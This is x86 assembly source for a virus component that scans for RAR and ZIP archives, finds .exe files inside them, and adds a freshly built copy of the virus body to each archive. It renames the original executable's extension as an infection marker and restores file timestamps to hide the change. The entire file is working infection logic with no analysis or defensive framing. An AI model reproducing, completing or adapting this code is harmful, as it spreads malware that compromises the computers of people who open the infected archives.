
MIN_ARC_SIZE            equ     <64*1024>         ; 64k
MAX_ARC_SIZE            equ     <16*1048576>      ; 16M

MIN_EXE_SIZE            equ     16384     ; minimal size of file to replace
MAX_FILES_TO_SCAN       equ     100

arc_object              struc
arc_open                dd      ?
arc_findthis            dd      ?
arc_findnext            dd      ?
arc_add                 dd      ?
arc_update              dd      ?
arc_close               dd      ?
arc_getextptr           dd      ?
arc_getunpsize          dd      ?
                        ends

include                 RARZIP.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\FILEIO\FILEIO.INC
include                 ..\MEMORY\MEMORY.INC
include                 ..\EXTMAN\EXTMAN.INC
include                 ..\MAKEBODY\MAKEBODY.INC

                        public  HandleEvent

                        public  infect_rar
                        public  infect_zip

                        extern  fopen_rw:PROC
                        extern  fread:PROC
                        extern  fwrite:PROC
                        extern  fgetsize:PROC
                        extern  fclose:PROC

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

rar_object:             dd      offset rar_open
                        dd      offset rar_findthis
                        dd      offset rar_findnext
                        dd      offset rar_add
                        dd      offset rar_update
                        dd      offset rar_close
                        dd      offset rar_getextptr
                        dd      offset rar_getunpsize

zip_object:             dd      offset zip_open
                        dd      offset zip_findthis
                        dd      offset zip_findnext
                        dd      offset zip_add
                        dd      offset zip_update
                        dd      offset zip_close
                        dd      offset zip_getextptr
                        dd      offset zip_getunpsize

mbi                     makebody_info  ?

tmp_handle              dd      ?

TMP_BUF_SIZE            equ     16384
tmp_buf                 db      TMP_BUF_SIZE dup (?)

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_EXTMAN_GOT_FILENAME
                        je      check_ext

return_0:               xor     eax, eax
                        retn

check_ext:
                        mov     eax, cs     ; its possible, but i dont want
                        cmp     eax, 28h    ; to do it in ring-0
                        je      return_0    ;

                        mov     ecx, [esp+8]

                        mov     eax, [ecx].ei_ffptr
                        mov     eax, [eax].ff_size
                        cmp     eax, MIN_ARC_SIZE
                        jb      return_0
                        cmp     eax, MAX_ARC_SIZE
                        ja      return_0

                        mov     edx, [ecx].ei_fnameptr  ; fnameptr

                        mov     eax, [ecx].ei_ext  ; ext
                        or      eax, 202020h

                        cmp     eax, 'rar'
                        je      __infect_rar
                        cmp     eax, 'piz'
                        je      __infect_zip

                        jmp     return_0

__infect_rar:           push    edx
                        call    infect_rar
                        pop     ecx
                        jmp     return_0

__infect_zip:           push    edx
                        call    infect_zip
                        pop     ecx
                        jmp     return_0

infect_zip:

  ; md dir sometimes contains some big ZIPs with java-related shit,
  ; w/o EXEs, so, we dont want even to parse it
                        mov     edx, [esp+4]
__cycle:                mov     eax, [edx]
                        inc     edx
                        or      eax, 20202000h
                        cmp     eax, 'niw\'    ; x:\WINdows\...
                        je      return_0       ;   ~~~~
                        or      al, al
                        jnz     __cycle

                        mov     edx, [esp+4]
                        call    process_zip
                        retn

infect_rar:
                        mov     edx, [esp+4]
                        call    process_rar
                        retn

include                 crc.inc
include                 rar.inc
include                 zip.inc

process_rar:            lea     eax, rar_object
                        jmp     process_archive

process_zip:            lea     eax, zip_object
                        jmp     process_archive

process_archive:        pusha
                        cld
                        xchg    ebp, eax

                        mov     [esp].popa_eax, 0         ; exit code

                        call    arc_open[ebp]             ; open archive
                        jc      __exit

                        mov     esi, MAX_FILES_TO_SCAN

__cycle:                dec     esi
                        jz      __exitcycle

                        call    arc_findnext[ebp]          ; get file header
                        jc      __exitcycle

                        call    arc_getextptr[ebp]
                        mov     eax, [eax]               ; get file extension

                        or      eax, EXT_NEW_LCASEMASK
                        cmp     eax, EXT_NEW    ; alredy infected?
                        je      __exitcycle

                        or      eax, 20202000h
                        cmp     eax, 'exe.'
                        jne     __cycle

                        call    arc_getunpsize[ebp]
                        cmp     eax, MIN_EXE_SIZE
                        jb      __cycle

                        mov     mbi.mbi_flags, 0
                        mov     mbi.mbi_datom, DATOM_ARC
                        mov     mbi.mbi_dsubsys, CUI

                        push    offset mbi
                        callW   build_dropper
                        add     esp, 4

                        or      eax, eax
                        jz      __exit

                        mov     edx, mbi.mbi_vir_ptr
                        mov     ecx, mbi.mbi_vir_size
                        xor     esi, esi ; file_name: 0=default
                        xor     ebx, ebx ; file_time: 0=default
                        call    arc_add[ebp]  ; add new file (our body) to archive

                        callW   build_free

                        call    arc_findthis[ebp]

                        call    arc_getextptr[ebp]
                        mov     dword ptr [eax], EXT_NEW  ; change extension

                        push    tmp_handle
                        callW   fgettimev

                        call    arc_update[ebp]  ; rename current file in archive

                        push    tmp_handle
                        callW   fsettimev

                        mov     [esp].popa_eax, 1    ; success

__exitcycle:            call    arc_close[ebp]

__exit:                 popa
                        retn

                        end
